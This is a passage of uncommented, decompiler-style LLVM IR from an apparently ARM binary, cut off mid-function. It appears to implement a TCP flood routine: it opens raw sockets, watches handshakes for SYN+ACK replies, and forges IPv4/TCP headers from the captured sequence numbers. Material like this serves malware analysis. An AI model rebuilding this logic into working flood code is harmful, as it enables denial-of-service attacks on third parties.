  %v0_99b4 = load i32, i32* @r4, align 4
  store i32 %v0_99b4, i32* %r0.global-to-local, align 4
  %v5_99bc = inttoptr i32 %v0_99a8 to i32*
  %v6_99bc = call i32 @function_8570(i32 %v0_99b4, i32* %v5_99bc, i32 12, i32 1, i32 %v1_99a4)
  %v1_99c4 = urem i32 %v6_99bc, 256
  store i32 %v1_99c4, i32* %ip.global-to-local, align 4
  %v0_99c8 = load i32, i32* @r5, align 4
  store i32 %v0_99c8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v5_99dc = inttoptr i32 %v0_99c8 to i32*
  %v6_99dc = call i32 @function_8570(i32 %v0_99d4, i32* %v5_99dc, i32 13, i32 1, i32 %v1_99c4)
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @function_8570(i32 %v0_99f4, i32* %v5_99fc, i32 14, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @function_8570(i32 %v0_9a14, i32* %v5_9a1c, i32 15, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @function_8570(i32 %v0_9a34, i32* %v5_9a3c, i32 16, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a50 = load i32, i32* @r5, align 4
  store i32 %v0_9a50, i32* %r1.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a50 to i32*
  %v6_9a5c = call i32 @function_8570(i32 %v0_9a54, i32* %v5_9a5c, i32 0, i32 768, i32 %v1_9a44)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a6c = load i32, i32* @r5, align 4
  store i32 %v0_9a6c, i32* %r1.global-to-local, align 4
  %v0_9a70 = load i32, i32* @r4, align 4
  store i32 %v0_9a70, i32* %r0.global-to-local, align 4
  %v5_9a74 = inttoptr i32 %v0_9a6c to i32*
  %v6_9a74 = call i32 @function_8570(i32 %v0_9a70, i32* %v5_9a74, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9a7c = urem i32 %v6_9a74, 256
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9a90 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_9a90, i32* %r0.global-to-local, align 4
  %v7_9a94 = icmp eq i32 %v3_9a90, -1
  store i1 %v7_9a94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9a90, i32* @sb, align 4
  br i1 %v7_9a94, label %dec_label_pc_9c84, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_98bc
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9aa8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9aa8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9abc = call i32 @function_115a0(i32 %v3_9a90, i32 0, i32 3, i32 %v6_9aa8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9abc, i32* %r0.global-to-local, align 4
  %v7_9ac0 = icmp eq i32 %v5_9abc, -1
  store i1 %v7_9ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ac0, label %dec_label_pc_9c7c, label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ac8 = load i32, i32* @r7, align 4
  %v3_9ac8 = mul i32 %v0_9ac8, 65536
  store i32 %v3_9ac8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9ad0 = load i32, i32* @r6, align 4
  %v2_9ad0 = icmp eq i32 %v0_9ad0, 0
  store i1 %v2_9ad0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9ad8 = urem i32 %v0_9ac8, 65536
  store i32 %v3_9ad8, i32* @fp, align 4
  br i1 %v2_9ad0, label %dec_label_pc_9f08, label %dec_label_pc_9ae0.preheader

dec_label_pc_9ae0.preheader:                      ; preds = %dec_label_pc_9ac8
  %v2_9b2c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9b70 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9ba8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bb4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bb8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c18 = zext i8 %tmp to i32
  %v1_9c1c = and i32 %v4_9c18, 18
  %v2_9c20 = icmp eq i32 %v1_9c1c, 18
  %v3_9c04 = sext i16 %tmp61 to i32
  %v1_9c28 = and i32 %v4_9c18, 5
  %v2_9c28 = icmp eq i32 %v1_9c28, 0
  %v4_9b68 = add i32 %v2_9b2c, 82
  %v5_9b68 = inttoptr i32 %v4_9b68 to i16*
  %v1_9d58 = add i32 %v6_9a5c, 40
  %v1_9e6c = urem i32 %v6_999c, 2
  %tmp97 = sub nsw i32 0, %v1_9e6c
  %v4_9e74 = and i32 %tmp97, 32
  %v1_9e84 = urem i32 %v6_99bc, 2
  %tmp98 = sub nsw i32 0, %v1_9e84
  %v4_9e8c = and i32 %tmp98, 16
  %v1_9e9c = urem i32 %v6_99dc, 2
  %tmp99 = sub nsw i32 0, %v1_9e9c
  %v4_9ea4 = and i32 %tmp99, 8
  %v1_9eb4 = urem i32 %v6_99fc, 2
  %tmp100 = sub nsw i32 0, %v1_9eb4
  %v4_9ebc = and i32 %tmp100, 4
  %v1_9ecc = urem i32 %v6_9a1c, 2
  %tmp101 = sub nsw i32 0, %v1_9ecc
  %v3_9ed4 = and i32 %tmp101, 2
  %v1_9ee4 = urem i32 %v6_9a3c, 2
  br label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %dec_label_pc_9ae0.preheader, %dec_label_pc_9c54
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c54 ], [ %tmp34, %dec_label_pc_9ae0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c54 ], [ %tmp37, %dec_label_pc_9ae0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9aec = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_9aec, i32* %r0.global-to-local, align 4
  %v7_9af0 = icmp eq i32 %v3_9aec, -1
  store i1 %v7_9af0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9aec, i32* @r5, align 4
  br i1 %v7_9af0, label %dec_label_pc_9c54, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ae0, %dec_label_pc_9c30
  %v0_9b04 = phi i32 [ %v3_9c44, %dec_label_pc_9c30 ], [ %v3_9aec, %dec_label_pc_9ae0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c30 ], [ %stack_var_-62.0, %dec_label_pc_9ae0 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d04, %dec_label_pc_9c30 ], [ %stack_var_-60.0, %dec_label_pc_9ae0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9b04 = call i32 @function_10c0c(i32 %v0_9b04, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b0c = or i32 %v2_9b04, 2048
  store i32 %v1_9b0c, i32* %r2.global-to-local, align 4
  %v0_9b10 = load i32, i32* @r5, align 4
  store i32 %v0_9b10, i32* %r0.global-to-local, align 4
  %v2_9b14 = call i32 @function_10c0c(i32 %v0_9b10, i32 4)
  %v3_9b18 = load i32, i32* %stack_var_-44, align 4
  %v5_9b20 = mul i32 %v3_9b18, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b2c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b34 = add i32 %v5_9b20, %arg2
  store i32 %v2_9b34, i32* %r3.global-to-local, align 4
  %v1_9b38 = add i32 %v2_9b34, 20
  %v2_9b38 = inttoptr i32 %v1_9b38 to i8*
  %v3_9b38 = load i8, i8* %v2_9b38, align 1
  %v4_9b38 = zext i8 %v3_9b38 to i32
  store i32 %v4_9b38, i32* %r2.global-to-local, align 4
  %v2_9b3c = icmp ugt i8 %v3_9b38, 30
  %v7_9b3c = icmp eq i8 %v3_9b38, 31
  store i1 %v7_9b3c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b40 = xor i1 %v7_9b3c, true
  %v3_9b40 = and i1 %v2_9b3c, %v2_9b40
  br i1 %v3_9b40, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9afc
  %v5_9b40 = add i32 %v2_9b34, 16
  %v6_9b40 = inttoptr i32 %v5_9b40 to i32*
  %v7_9b40 = load i32, i32* %v6_9b40, align 4
  store i32 %v7_9b40, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9afc, %bb
  %v4_9b44 = phi i32 [ %v2_9b34, %dec_label_pc_9afc ], [ %v7_9b40, %bb ]
  %v4_9b44.stack_var_-60.1 = select i1 %v3_9b40, i32 %v4_9b44, i32 %stack_var_-60.1
  %v2_9b48 = xor i1 %v2_9b3c, true
  %v3_9b48 = or i1 %v7_9b3c, %v2_9b48
  br i1 %v3_9b48, label %dec_label_pc_9c90, label %dec_label_pc_9b4c

dec_label_pc_9b4c:                                ; preds = %bb71, %dec_label_pc_9c90
  %v0_9d04 = phi i32 [ %v5_9ce0, %dec_label_pc_9c90 ], [ %v4_9b44.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9b54 = load i32, i32* @sl, align 4
  %v9_9b54 = icmp eq i32 %v0_9b54, 65535
  store i1 %v9_9b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b54, label %dec_label_pc_9cec, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b4c
  %v4_9b58 = udiv i32 %v0_9b54, 256
  %v2_9b5c = urem i32 %v0_9b54, 256
  store i32 %v2_9b5c, i32* %r2.global-to-local, align 4
  %v5_9b60 = mul nuw nsw i32 %v2_9b5c, 256
  %v6_9b60 = or i32 %v5_9b60, %v4_9b58
  store i32 %v6_9b60, i32* %r3.global-to-local, align 4
  store i32 %v2_9b2c, i32* %r0.global-to-local, align 4
  %v2_9b68 = trunc i32 %v6_9b60 to i16
  store i16 %v2_9b68, i16* %v5_9b68, align 2
  br label %dec_label_pc_9b70

dec_label_pc_9b70:                                ; preds = %.thread9, %dec_label_pc_9cec
  %stack_var_-62.2 = phi i16 [ %v1_9cec, %dec_label_pc_9cec ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9b70, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r0.global-to-local, align 4
  %v3_9b7c = call i32 @function_113cc(i32 %v0_9b78, i32 %v2_9b70, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9b84 = call i32 @function_10a58(i32* null)
  store i32 %v2_9b84, i32* %r0.global-to-local, align 4
  store i32 %v2_9b84, i32* @r4, align 4
  %v9_9be4 = icmp eq i32 %tmp35, %v0_9d04
  %v4_9c0c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9be4 to i32
  %v9_9bf8 = icmp eq i1 %v9_9be4, false
  %v9_9c10 = icmp eq i32 %v3_9c04, %v4_9c0c
  br label %dec_label_pc_9ba0

dec_label_pc_9b90:                                ; preds = %.thread, %dec_label_pc_9c00, %dec_label_pc_9c28, %bb75
  %v2_9b90 = call i32 @function_10a58(i32* null)
  %v0_9b94 = load i32, i32* @r4, align 4
  %v2_9b94 = sub i32 %v2_9b90, %v0_9b94
  store i32 %v2_9b94, i32* %r0.global-to-local, align 4
  %v7_9b98 = icmp eq i32 %v2_9b94, 10
  store i1 %v7_9b98, i1* %cpsr_z.global-to-local, align 1
  %v8_9b9c = icmp sgt i32 %v2_9b94, 10
  br i1 %v8_9b9c, label %dec_label_pc_9c30, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b90, %dec_label_pc_9b70
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bb4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bb8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sb, align 4
  store i32 %v0_9bc0, i32* %r0.global-to-local, align 4
  %v6_9bc8 = call i32 @function_114ec(i32 %v0_9bc0, i32 %v2_9bb4, i32 256, i32 16384, i32 %v2_9ba8, i32 %v2_9bb8)
  store i32 %v6_9bc8, i32* %r2.global-to-local, align 4
  %v7_9bd0 = icmp eq i32 %v6_9bc8, -1
  store i1 %v7_9bd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9bd0, label %dec_label_pc_9c84, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9ba0
  store i32 %v0_9d04, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9bf0 = icmp eq i32 %v6_9bc8, 40
  store i1 %v7_9bf0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_9bc8, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_9bdc
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9b90

bb75:                                             ; preds = %dec_label_pc_9bdc
  store i1 %v9_9bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9bf8, label %dec_label_pc_9b90, label %dec_label_pc_9c00

dec_label_pc_9c00:                                ; preds = %bb75
  store i32 %v3_9c04, i32* @lr, align 4
  store i32 %v2_9b2c, i32* @r3, align 4
  store i32 %v4_9c0c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c10, label %dec_label_pc_9c18, label %dec_label_pc_9b90

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9c00
  store i32 %v4_9c18, i32* %r2.global-to-local, align 4
  store i32 %v1_9c1c, i32* @r3, align 4
  store i1 %v2_9c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c20, label %dec_label_pc_9cfc, label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9c18
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c28, label %dec_label_pc_9b90, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c28, %dec_label_pc_9b90
  %v0_9c30 = load i32, i32* @r5, align 4
  store i32 %v0_9c30, i32* %r0.global-to-local, align 4
  %v1_9c34 = call i32 @function_10dd8(i32 %v0_9c30)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c44 = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_9c44, i32* %r0.global-to-local, align 4
  %v3_9c48 = icmp eq i32 %v3_9c44, -1
  %v8_9c48 = icmp eq i32 %v3_9c44, -1
  store i1 %v8_9c48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c44, i32* @r5, align 4
  br i1 %v3_9c48, label %dec_label_pc_9c54, label %dec_label_pc_9afc

dec_label_pc_9c54:                                ; preds = %dec_label_pc_9c30, %dec_label_pc_9ae0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9ae0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_9c30 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9ae0 ], [ %v0_9d04, %bb82 ], [ %v0_9d04, %dec_label_pc_9c30 ]
  %v3_9c54 = load i32, i32* %stack_var_-44, align 4
  %v1_9c58 = add i32 %v3_9c54, 1
  store i32 %v1_9c58, i32* @r3, align 4
  %v1_9c5c = load i32, i32* @r6, align 4
  %v9_9c5c = icmp eq i32 %v1_9c58, %v1_9c5c
  store i1 %v9_9c5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c58, i32* %stack_var_-44, align 4
  %v5_9c64 = icmp slt i32 %v1_9c58, %v1_9c5c
  br i1 %v5_9c64, label %dec_label_pc_9ae0, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c54
  store i32 %v6_9a5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f18

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9aa0
  %v0_9c7c = load i32, i32* @sb, align 4
  store i32 %v0_9c7c, i32* %r0.global-to-local, align 4
  %v1_9c80 = call i32 @function_10dd8(i32 %v0_9c7c)
  store i32 %v1_9c80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c84

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9ba0, %dec_label_pc_98bc, %dec_label_pc_9c7c
  %v1_9c8c = phi i32 [ %v3_9a90, %dec_label_pc_98bc ], [ %v1_9c80, %dec_label_pc_9c7c ], [ 0, %dec_label_pc_9ba0 ]
  store i32 %v27_98bc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9c8c

dec_label_pc_9c90:                                ; preds = %bb71
  %v1_9c90 = add i32 %v4_9b44, 16
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r4, align 4
  %v0_9c94 = call i32 @function_e0b4()
  store i32 %v0_9c94, i32* %r0.global-to-local, align 4
  %v3_9c98 = load i32, i32* %stack_var_-44, align 4
  %v5_9ca0 = mul i32 %v3_9c98, 24
  %v0_9ca8 = load i32, i32* @r4, align 4
  %v1_9ca8 = and i32 %v0_9ca8, 16711680
  store i32 %v1_9ca8, i32* %ip.global-to-local, align 4
  %v3_9cac = udiv i32 %v0_9ca8, 16777216
  %v2_9cb0 = add i32 %v5_9ca0, %arg2
  store i32 %v2_9cb0, i32* %r1.global-to-local, align 4
  %v4_9cb4 = udiv i32 %v1_9ca8, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9cac
  store i32 %v5_9cb4, i32* %r2.global-to-local, align 4
  %v1_9cb8 = and i32 %v0_9ca8, 65280
  store i32 %v1_9cb8, i32* %r3.global-to-local, align 4
  %v1_9cbc = add i32 %v2_9cb0, 20
  %v2_9cbc = inttoptr i32 %v1_9cbc to i8*
  %v3_9cbc = load i8, i8* %v2_9cbc, align 1
  %v4_9cbc = zext i8 %v3_9cbc to i32
  store i32 %v4_9cbc, i32* %ip.global-to-local, align 4
  %v5_9cc4 = call i32 @llvm.bswap.i32(i32 %v0_9ca8)
  %v7_9cc8 = lshr i32 %v0_9c94, %v4_9cbc
  %v8_9cc8 = add i32 %v7_9cc8, %v5_9cc4
  store i32 %v8_9cc8, i32* %r2.global-to-local, align 4
  %v1_9ccc = and i32 %v8_9cc8, 16711680
  store i32 %v1_9ccc, i32* %r0.global-to-local, align 4
  %v1_9cd8 = and i32 %v8_9cc8, 65280
  store i32 %v1_9cd8, i32* %r1.global-to-local, align 4
  %v5_9ce0 = call i32 @llvm.bswap.i32(i32 %v8_9cc8)
  store i32 %v5_9ce0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b4c

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9b4c
  %v0_9cec = call i32 @function_e0b4()
  %v1_9cec = trunc i32 %v0_9cec to i16
  store i32 %v0_9cec, i32* %r0.global-to-local, align 4
  store i32 %v2_9b2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9b70

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c18
  %v3_9cfc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9cfc, i32* @r4, align 4
  store i32 %v2_98d8, i32* %ip.global-to-local, align 4
  %v5_9d04 = mul i32 %v3_9cfc, 16
  %v6_9d04 = add i32 %v5_9d04, %v2_98d8
  %v7_9d04 = inttoptr i32 %v6_9d04 to i32*
  store i32 %v0_9d04, i32* %v7_9d04, align 4
  %v0_9d08 = load i32, i32* @r8, align 4
  %v1_9d08 = add i32 %v0_9d08, 4
  %v2_9d08 = inttoptr i32 %v1_9d08 to i32*
  %v3_9d08 = load i32, i32* %v2_9d08, align 4
  store i32 %v3_9d08, i32* %r1.global-to-local, align 4
  %v1_9d14 = and i32 %v3_9d08, 65280
  store i32 %v1_9d14, i32* %r2.global-to-local, align 4
  store i32 %v2_98d8, i32* %r0.global-to-local, align 4
  %v0_9d24 = load i32, i32* @r4, align 4
  %v3_9d24 = mul i32 %v0_9d24, 16
  %v2_9d28 = add i32 %v3_9d24, %v2_98d8
  store i32 %v2_9d28, i32* %ip.global-to-local, align 4
  %v5_9d2c = call i32 @llvm.bswap.i32(i32 %v3_9d08)
  store i32 %v5_9d2c, i32* %r3.global-to-local, align 4
  %v2_9d30 = add i32 %v2_9d28, 4
  %v3_9d30 = inttoptr i32 %v2_9d30 to i32*
  store i32 %v5_9d2c, i32* %v3_9d30, align 4
  %v0_9d34 = load i32, i32* @r8, align 4
  %v1_9d34 = add i32 %v0_9d34, 8
  %v2_9d34 = inttoptr i32 %v1_9d34 to i32*
  %v3_9d34 = load i32, i32* %v2_9d34, align 4
  store i32 %v3_9d34, i32* %r1.global-to-local, align 4
  %v1_9d38 = and i32 %v3_9d34, 16711680
  store i32 %v1_9d38, i32* %r0.global-to-local, align 4
  store i32 %v6_9a5c, i32* %r2.global-to-local, align 4
  %v5_9d50 = call i32 @llvm.bswap.i32(i32 %v3_9d34)
  store i32 %v5_9d50, i32* %r3.global-to-local, align 4
  %v1_9d54 = add i32 %v0_9d34, 2
  %v2_9d54 = inttoptr i32 %v1_9d54 to i16*
  %v3_9d54 = load i16, i16* %v2_9d54, align 2
  %v4_9d54 = zext i16 %v3_9d54 to i32
  store i32 %v4_9d54, i32* %r1.global-to-local, align 4
  store i32 %v1_9d58, i32* @r7, align 4
  %v0_9d5c = load i32, i32* @lr, align 4
  %v1_9d5c = trunc i32 %v0_9d5c to i16
  %v2_9d5c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d5c = add i32 %v2_9d5c, 14
  %v4_9d5c = inttoptr i32 %v3_9d5c to i16*
  store i16 %v1_9d5c, i16* %v4_9d5c, align 2
  %v0_9d60 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d60 = trunc i32 %v0_9d60 to i16
  %v2_9d60 = load i32, i32* %ip.global-to-local, align 4
  %v3_9d60 = add i32 %v2_9d60, 12
  %v4_9d60 = inttoptr i32 %v3_9d60 to i16*
  store i16 %v1_9d60, i16* %v4_9d60, align 2
  %v0_9d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d64 = load i32, i32* %ip.global-to-local, align 4
  %v2_9d64 = add i32 %v1_9d64, 8
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v0_9d64, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* @r7, align 4
  store i32 %v0_9d68, i32* @r0, align 4
  %v0_9d6c = call i32 @function_1182c()
  store i32 %v0_9d6c, i32* %r0.global-to-local, align 4
  store i32 %v2_98e8, i32* %r3.global-to-local, align 4
  %v2_9d78 = load i32, i32* @r4, align 4
  %v5_9d78 = mul i32 %v2_9d78, 4
  %v6_9d78 = add i32 %v5_9d78, %v2_98e8
  %v7_9d78 = inttoptr i32 %v6_9d78 to i32*
  store i32 %v0_9d6c, i32* %v7_9d78, align 4
  %v3_9d7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d7c, i32* %r2.global-to-local, align 4
  %v0_9d80 = load i32, i32* %r3.global-to-local, align 4
  %v4_9d80 = mul i32 %v3_9d7c, 4
  %v5_9d80 = add i32 %v0_9d80, %v4_9d80
  %v6_9d80 = inttoptr i32 %v5_9d80 to i32*
  %v7_9d80 = load i32, i32* %v6_9d80, align 4
  store i32 %v7_9d80, i32* @r4, align 4
  %v1_9d84 = inttoptr i32 %v7_9d80 to i8*
  %v2_9d84 = load i8, i8* %v1_9d84, align 1
  %tmp103 = urem i8 %v2_9d84, 16
  %v1_9d88 = zext i8 %tmp103 to i32
  %v1_9d8c = or i32 %v1_9d88, 64
  store i32 %v1_9d8c, i32* %r3.global-to-local, align 4
  %v1_9d90 = trunc i32 %v1_9d8c to i8
  store i8 %v1_9d90, i8* %v1_9d84, align 1
  %v0_9d94 = load i32, i32* @r4, align 4
  %v1_9d94 = inttoptr i32 %v0_9d94 to i8*
  %v2_9d94 = load i8, i8* %v1_9d94, align 1
  %v0_9d98 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_9d98, 256
  %v1_9da0 = and i8 %v2_9d94, -16
  %v1_9da4 = or i8 %v1_9da0, 5
  %v1_9da8 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_9d98, 256
  %v4_9dac = urem i32 %tmp78, 256
  %v5_9dac = or i32 %v4_9dac, %v1_9da8
  store i32 %v5_9dac, i32* %r2.global-to-local, align 4
  %v0_9db0 = load i32, i32* @fp, align 4
  %v1_9db0 = urem i32 %v0_9db0, 256
  store i32 %v1_9db0, i32* %r0.global-to-local, align 4
  store i32 %v1_9968, i32* %ip.global-to-local, align 4
  %v3_9db8 = udiv i32 %v0_9db0, 256
  store i32 %v3_9db8, i32* %r1.global-to-local, align 4
  store i8 %v1_9da4, i8* %v1_9d94, align 1
  %v0_9dc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9dc0 = load i32, i32* %r0.global-to-local, align 4
  %v4_9dc0 = mul i32 %v1_9dc0, 256
  %v5_9dc0 = or i32 %v4_9dc0, %v0_9dc0
  store i32 %v5_9dc0, i32* %r1.global-to-local, align 4
  store i32 %v6_9900, i32* %r0.global-to-local, align 4
  %v2_9dc8 = load i32, i32* @r4, align 4
  %v3_9dc8 = add i32 %v2_9dc8, 1
  %v4_9dc8 = inttoptr i32 %v3_9dc8 to i8*
  store i8 %v5_9920, i8* %v4_9dc8, align 1
  %v0_9dcc = load i32, i32* %r1.global-to-local, align 4
  %v1_9dcc = trunc i32 %v0_9dcc to i16
  %v2_9dcc = load i32, i32* @r4, align 4
  %v3_9dcc = add i32 %v2_9dcc, 4
  %v4_9dcc = inttoptr i32 %v3_9dcc to i16*
  store i16 %v1_9dcc, i16* %v4_9dcc, align 2
  %v0_9dd0 = load i32, i32* %ip.global-to-local, align 4
  %v2_9dd0 = icmp eq i32 %v0_9dd0, 0
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_995c, i32* %r1.global-to-local, align 4
  %v0_9dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_9dd8 = trunc i32 %v0_9dd8 to i16
  %v2_9dd8 = load i32, i32* @r4, align 4
  %v3_9dd8 = add i32 %v2_9dd8, 2
  %v4_9dd8 = inttoptr i32 %v3_9dd8 to i16*
  store i16 %v1_9dd8, i16* %v4_9dd8, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9cfc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

